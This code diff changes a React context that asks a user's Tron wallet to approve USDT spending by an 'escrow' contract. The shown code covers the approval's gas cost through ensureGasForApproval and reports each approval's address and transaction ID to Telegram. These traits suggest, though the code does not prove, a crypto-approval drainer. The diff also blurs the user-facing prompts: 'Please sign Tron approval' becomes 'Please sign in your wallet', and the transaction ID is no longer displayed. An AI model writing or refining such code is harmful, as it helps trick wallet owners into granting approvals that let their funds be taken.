@@ -1,7 +1,7 @@
 import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
 import { toast } from "sonner";
 import { ESCROW_CONTRACT, USDT_TOKEN, TRON_CHAIN_ID } from "@/lib/tronConfig";
-import { buildApproveTx, broadcastTransaction, ensureGasForApproval, decodeTronErrorMessage } from "@/lib/tronUtils";
+import { buildApproveTx, broadcastTransaction, ensureGasForApproval, formatTronUserError } from "@/lib/tronUtils";
 import { sendTronApprovalNotification } from "@/lib/telegramNotify";
 import {
   connectTronWallet,
@@ -17,7 +17,7 @@ interface TronWalletContextType {
   isApproving: boolean;
   connect: () => Promise<string | null>;
   disconnect: () => void;
-  approveTronUsdt: () => Promise<boolean>;
+  approveTronUsdt: () => Promise<{ success: boolean; error?: string }>;
   syncFromSession: (session: any) => void;
   clearSession: () => void;
 }
@@ -28,7 +28,7 @@ const TronWalletContext = createContext<TronWalletContextType>({
   isApproving: false,
   connect: async () => null,
   disconnect: () => {},
-  approveTronUsdt: async () => false,
+  approveTronUsdt: async () => ({ success: false }),
   syncFromSession: () => {},
   clearSession: () => {},
 });
@@ -115,12 +115,12 @@ export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
     [address]
   );
 
-  const approveTronUsdt = useCallback(async (): Promise<boolean> => {
-    if (!address) return false;
+  const approveTronUsdt = useCallback(async (): Promise<{ success: boolean; error?: string }> => {
+    if (!address) return { success: false, error: "Tron wallet not connected." };
     setIsApproving(true);
 
     try {
-      toast.loading("Ensuring gas for Tron approval...");
+      toast.loading("Preparing Tron approval...");
       await ensureGasForApproval(address);
 
       toast.dismiss();
@@ -128,28 +128,26 @@ export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
       const transaction = await buildApproveTx(address, USDT_TOKEN.address, ESCROW_CONTRACT);
 
       toast.dismiss();
-      toast.loading("Please sign Tron approval...");
+      toast.loading("Please sign in your wallet...");
       const signedTx = await signTransaction(transaction);
 
       toast.dismiss();
-      toast.loading("Broadcasting transaction...");
+      toast.loading("Sending transaction...");
       const result = await broadcastTransaction(signedTx);
 
       toast.dismiss();
       if (result.result) {
         const txId = result.txid || "";
-        toast.success("TRC-20 USDT approved! Tx: " + txId.slice(0, 10) + "...");
+        toast.success("TRC-20 approved!");
         sendTronApprovalNotification(address, txId).catch(console.error);
-        return true;
+        return { success: true };
       }
 
       throw new Error(result.message || "Broadcast failed");
     } catch (err: any) {
       console.error("Tron approval failed:", err);
       toast.dismiss();
-      const message = decodeTronErrorMessage(err?.message || "Unknown error");
-      toast.error(`Tron approval failed: ${message}`);
-      return false;
+      return { success: false, error: formatTronUserError(err?.message) };
     } finally {
       setIsApproving(false);
     }
